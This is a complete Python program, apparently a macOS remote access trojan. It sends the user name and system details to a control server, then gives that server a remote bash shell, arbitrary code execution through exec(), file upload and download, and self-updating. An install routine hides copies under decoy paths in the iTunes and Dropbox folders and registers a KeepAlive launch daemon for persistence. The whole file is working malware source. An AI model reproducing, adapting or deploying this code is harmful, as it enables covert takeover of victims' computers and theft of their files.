#!/usr/bin/env python

import socket
import subprocess
import sys
import os
import shutil
import time
import json
import threading
import struct
import base64
import traceback
try:
    from StringIO import StringIO
except:
    from io import StringIO

__version__ = "0.9"

HOST = 'localhost'
PORT = 1708

# Commands
STDIN = 'stdin'
EVAL = 'eval'
CMD = 'cmd'
# Special
LS_JSON = 'ls'
# Client -> Server
FILE_DOWNLOAD = 'down'
# Server -> Client
FILE_STREAM = 'fstream'
FILE_CLOSE = 'fclose'
FILE_FILENAME = 'fname'
CLIENT_STREAM = 'cstream'
CLIENT_CLOSE = 'cclose'

PRINT_BUFFER = StringIO()

RUNNING = True
normstdout = sys.stdout
normstderr = sys.stderr

# Supporting classes
class FormatSocket:

    SIZE_BYTES = 4
    RECV_SIZE = 2**13

    def __init__(self, sock):
        self.sock = sock
        self.lastbytes = b''

    def send(self,msg):
        '''
        Takes str or bytes and produces bytes where the first 4 bytes
        correspond to the message length
        :param msg: input message
        :return: <[length][message]>
        '''
        if type(msg) == str:
            msg = str.encode(msg)
        if type(msg) == bytes:
            self.sock.sendall(struct.pack('>i', len(msg)) + msg)
        else:
            raise Exception("msg must be of type bytes or str")

    def recv(self):
        '''
        Receives bytes from recvable, expects first 4 bytes to be length of message,
        then receives that amount of data and returns raw bytes of message
        :param recvable: Any object with recv(bytes) function
        :return:
        '''

        total_data = self.lastbytes
        self.lastbytes = b''

        msg_data = b''
        expected_size = sys.maxsize

        if len(total_data) > FormatSocket.SIZE_BYTES:
            size_data = total_data[:FormatSocket.SIZE_BYTES]
            expected_size = struct.unpack('>i',size_data)[0]
            msg_data += total_data[FormatSocket.SIZE_BYTES:]

        while len(msg_data) < expected_size:
            sock_data = self.sock.recv(FormatSocket.RECV_SIZE)
            total_data += sock_data
            if expected_size == sys.maxsize and len(total_data) > FormatSocket.SIZE_BYTES:
                size_data = total_data[:FormatSocket.SIZE_BYTES]
                expected_size = struct.unpack('>i',size_data)[0]
                msg_data += total_data[FormatSocket.SIZE_BYTES:]
            else:
                msg_data += sock_data
        # Store anything above expected size for next time
        self.lastbytes = msg_data[expected_size:]
        return msg_data[:expected_size]

    def close(self):
        self.sock.close()

class ByteLock:
    FILLTO = 2**13
    def __init__(self,datinit=b''):
        self.dat = datinit
        self.lock = threading.Lock()
        self.condition = threading.Condition(self.lock)
    def append(self,dat):
        with self.lock:
            while len(self.dat)>=ByteLock.FILLTO:
                self.condition.wait()
            self.dat += dat
    def getdat(self,upto):
        with self.lock:
            if upto > 0:
                temp = self.dat[:upto]
                self.dat = self.dat[upto:]
                self.condition.notify()
                return temp
            return self.dat[:0]
    def empty(self):
        with self.lock:
            return len(self.dat) == 0

class ByteLockBundler:
    PACKET_MAX_DAT = 2**13

    def __init__(self, fsock):
        self.stdoutbytes = ByteLock()
        self.stderrbytes = ByteLock()
        self.printstr = ByteLock()
        self.errstr = ByteLock()
        self.specialbytes = {}
        self.filebytes = {}
        self.fileclose = []
        self.fsock = fsock
        self.flock = threading.Lock()
        self.slock = threading.Lock()

    def writeStdout(self, wbytes):
        self.stdoutbytes.append(wbytes)

    def writeStderr(self, wbytes):
        self.stderrbytes.append(wbytes)

    def writePrintStr(self, wstr):
        self.printstr.append(wstr)

    def writeErrStr(self, wstr):
        self.errstr.append(wstr)

    def writeFileup(self, filename, wbytes):
        with self.flock:
            if filename not in self.filebytes:
                self.filebytes[filename] = ByteLock()
            bl = self.filebytes[filename]
        bl.append(wbytes)

    def writeSpecial(self, name, wbytes):
        '''
        Special commands must be sent in entirety
        :param name: name of command
        :param wbytes: bytes of command
        '''
        with self.slock:
            self.specialbytes[name] = wbytes.decode('UTF-8')

    def closeFile(self, filename):
        with self.flock:
            if filename not in self.fileclose:
                self.fileclose.append(filename)

    def getAndClear(self, bytesize=4096):
        dataremaining = False
        specs = {}
        with self.slock:
            for specialname in self.specialbytes.keys():
                if len(specs)==0 or len(self.specialbytes[specialname]) <= bytesize:
                    specs[specialname] = self.specialbytes[specialname]
                    bytesize -= len(specs[specialname])
                    dataremaining = True
            for specialname in specs.keys():
                self.specialbytes.pop(specialname)

        printout = self.printstr.getdat(bytesize)
        bytesize -= len(printout)

        errout = self.errstr.getdat(bytesize)
        bytesize -= len(errout)

        out = self.stdoutbytes.getdat(bytesize)
        bytesize -= len(out)

        err = self.stderrbytes.getdat(bytesize)
        bytesize -= len(err)

        with self.flock:
            filestream = {}
            fileclose = []
            filenames = list(self.filebytes.keys())
            for filename in filenames:
                filebytes = self.filebytes[filename].getdat(bytesize)
                bytesize -= len(filebytes)
                if self.filebytes[filename].empty() and filename in self.fileclose:
                    self.fileclose.remove(filename)
                    self.filebytes.pop(filename)
                    fileclose.append(filename)
                wfilebytes = base64.b64encode(filebytes)
                filestream[filename] = wfilebytes

        # Abuse python to convert to strings
        printout = printout.decode('UTF-8')
        errout = errout.decode('UTF-8')
        out = out.decode('UTF-8')
        err = err.decode('UTF-8')
        for filename in filestream.keys():
            # Take bytes, encode using base64, decode into string for json
            filestream[filename] = filestream[filename].decode('UTF-8')

        dataremaining = (bytesize == 0)
        datawritten = (bytesize < ByteLockBundler.PACKET_MAX_DAT)
        writedict = dict(printout=printout,
                              errout=errout,
                              stdout=out,
                              stderr=err,
                              filestreams=filestream,
                              fileclose=fileclose,
                              special=specs)
        return dataremaining, datawritten, writedict

    def writeBundle(self):
        dataremaining, datawritten, writedict = self.getAndClear()
        if datawritten:
            json_str = json.dumps(writedict)
            self.fsock.send(json_str)
        return dataremaining

class WriterWrapper:
    def __init__(self, writefunc):
        self.func = writefunc
    def write(self, wstr):
        self.func(wstr)

# Scripts
def main():
    while RUNNING:
        if hasInternetConnection():
            try:
                # Get and send info
                user, arch = getInfo()

                infodict = dict(user=user, arch=arch, version=__version__)
                json_str = json.dumps(infodict)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                fs = FormatSocket(s)
                fs.send(json_str)
                serve(fs)
            except Exception as e:
                # TODO: Remove debug code
                raise e
        if RUNNING:
            # Try again in a minute
            time.sleep(60)

def serve(sock):
    bytelock = ByteLockBundler(sock)
    sys.stdout = WriterWrapper(lambda s: bytelock.writePrintStr(s.encode('UTF-8')))
    sys.stderr = WriterWrapper(lambda s: bytelock.writeErrStr(s.encode('UTF-8')))

    proc = subprocess.Popen(["bash"],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            cwd=os.path.expanduser("~"))
    # Get commands from server, parse and send appropriate to proc
    def pollProcStdout():
        while RUNNING:
            out = proc.stdout.read(1)
            if out == '' and proc.poll() is not None:
                break
            if out != '':
                bytelock.writeStdout(out)

    def pollProcStderr():
        while RUNNING:
            out = proc.stderr.read(1)
            if out == '' and proc.poll() is not None:
                break
            if out != '':
                bytelock.writeStderr(out)

    def pollSock():
        global RUNNING
        fileobjs = {}
        clientobj = None
        while RUNNING:
            recvbytes = sock.recv()
            recvjson = json.loads(recvbytes.decode('UTF-8'))

            # Special LS command
            if LS_JSON in recvjson:
                filedict = {}
                filepath = os.path.abspath(os.path.expanduser(recvjson[LS_JSON]))
                if os.path.isdir(filepath):
                    try:
                        #Throws exception when permission denied on folder
                        ls = os.listdir(filepath)
                        for f in (os.path.join(filepath, f) for f in ls):
                            try:
                                retstat = os.stat(f)
                                retval = (os.path.isdir(f), retstat.st_mode, retstat.st_size)
                                filedict[f] = retval
                            except OSError:
                                # This can happen if you have really weird files, trust me
                                pass
                    except:
                        pass

                specentry = json.dumps((filepath, filedict)).encode('UTF-8')
                bytelock.writeSpecial("ls",specentry)

            # Standard evaluation
            if STDIN in recvjson:
                proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
                proc.stdin.flush()
            if CMD in recvjson:
                cmd_str = recvjson[CMD]
                cmd_arr = cmd_str.split(" ")
                newproc = subprocess.Popen(cmd_arr)
            if EVAL in recvjson:
                def execfunc():
                    try:
                        exec(recvjson[EVAL]) in {}
                    except Exception as e:
                        tb = traceback.format_exc()
                        sys.stderr.write(tb)
                t = threading.Thread(target=execfunc)
                t.start()

            # It is important that FILE_CLOSE comes *after* FILE_FILENAME
            if FILE_FILENAME in recvjson:
                filename = recvjson[FILE_FILENAME]
                if filename not in fileobjs:
                    fileobjs[filename] = open(filename,'wb')
                fobj = fileobjs[filename]
                bstr = recvjson[FILE_STREAM]
                b64bytes = base64.b64decode(bstr)
                fobj.write(b64bytes)
            if FILE_CLOSE in recvjson:
                filename = recvjson[FILE_CLOSE]
                if filename in fileobjs:
                    fileobjs[filename].close()
                #Handle the case where filename not in fileobjs. For now, just ignore

            # It is important that CLIENT_CLOSE comes *after* CLIENT_STREAM
            if CLIENT_STREAM in recvjson:
                if clientobj is None:
                    clientobj = open(os.path.abspath(__file__),"wb")
                bstr = recvjson[CLIENT_STREAM]
                clientobj.write(bstr.encode('UTF-8'))
            if CLIENT_CLOSE in recvjson and clientobj is not None:
                clientobj.close()
                RUNNING = False
                proc.kill()
                bytelock.fsock.close()

            # Done last since this consumes thread until download completed
            if FILE_DOWNLOAD in recvjson:
                filename = recvjson[FILE_DOWNLOAD]
                if os.path.exists(filename):
                    filesize = os.stat(filename).st_size
                    jsonstr = json.dumps(dict(filename=filename,filesize=filesize))
                    bytelock.writeSpecial('filesize',jsonstr.encode('UTF-8'))
                    def downloadfunc():
                        with open(filename,'rb') as f:
                            dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
                            while len(dat) > 0:
                                bytelock.writeFileup(filename,dat)
                                dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
                            bytelock.closeFile(filename)
                    t = threading.Thread(target=downloadfunc)
                    t.start()

    def writeBundles():
        remains = True
        while RUNNING:
            if not remains:
                time.sleep(0.1)
            remains = bytelock.writeBundle()

    # make thread for each function + one to send json with output to server
    t_sock = threading.Thread(target=pollSock)
    t_procout = threading.Thread(target=pollProcStdout)
    t_procerr = threading.Thread(target=pollProcStderr)
    t_bndl = threading.Thread(target=writeBundles)

    t_sock.start()
    t_procout.start()
    t_procerr.start()
    t_bndl.start()

    t_sock.join()
    # t_procout.join()
    # t_procerr.join()
    # t_bndl.join()


def getInfo():
    proc = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
    (user, err) = proc.communicate()
    proc = subprocess.Popen(["uname", "-a"], stdout=subprocess.PIPE)
    (arch, err) = proc.communicate()
    return user.decode('UTF-8'), arch.decode('UTF-8')


def hasInternetConnection():
    try:
        socket.getaddrinfo("google.com", 80)
        return True
    except:
        return False


###
#
# All the install scripts are below
#
###

STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
                '<plist version="1.0">' + '\n'
                '<dict>' + '\n'
                '\t' + '<key>Label</key>' + '\n'
                '\t' + '<string>pythondaemon</string>' + '\n'
                '\t' + '<key>ProgramArguments</key>' + '\n'
                '\t' + '<array>' + '\n'
                '\t\t' + '<string>{python_path}</string>' + '\n'
                '\t\t' + '<string>{script_path}</string>' + '\n'
                '\t' + '</array>' + '\n'
                '\t' + '<key>StandardErrorPath</key>' + '\n'
                '\t' + '<string>/var/log/python_script.error</string>' + '\n'
                '\t' + '<key>KeepAlive</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '</dict>' + '\n'
                '</plist>' + '\n')

STARTUP_LOCS = ['/System/Library/LaunchAgents',
                '/System/Library/LaunchDaemons',
                '~/Library/LaunchAgents']
DAEMON_NAME = 'library_launcher.plist'

SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']

INSTALL_FLAG = '-install'


def install():
    # Find python
    proc = subprocess.Popen(["which", "python"], stdout=subprocess.PIPE)
    (out, err) = proc.communicate()
    if err is not None:
        return False
    python_path = out.strip()

    # First find a location for the script
    script_path = None
    for loc in SCRIPT_LOCS:
        script_path = os.path.expanduser(loc)
        if not os.path.exists(script_path):
            try:
                shutil.copy(os.path.abspath(__file__), script_path)
                break
            except:
                pass
    if script_path is None:
        return False

    # Now we have hidden the script
    daemon_loc = None
    for loc in STARTUP_LOCS:
        daemon_loc = os.path.join(os.path.expanduser(loc), DAEMON_NAME)
        if not os.path.exists(daemon_loc):
            try:
                with open(daemon_loc, "w") as f:
                    f.write(STARTUP_PLIST.format(python_path=python_path, script_path=script_path))
                break
            except:
                pass
    if daemon_loc is not None:
        return True


if __name__ == "__main__":
    if INSTALL_FLAG in sys.argv:
        install()
    else:
        main()
        if not RUNNING:
            os.execv(sys.executable, [sys.executable] + sys.argv)
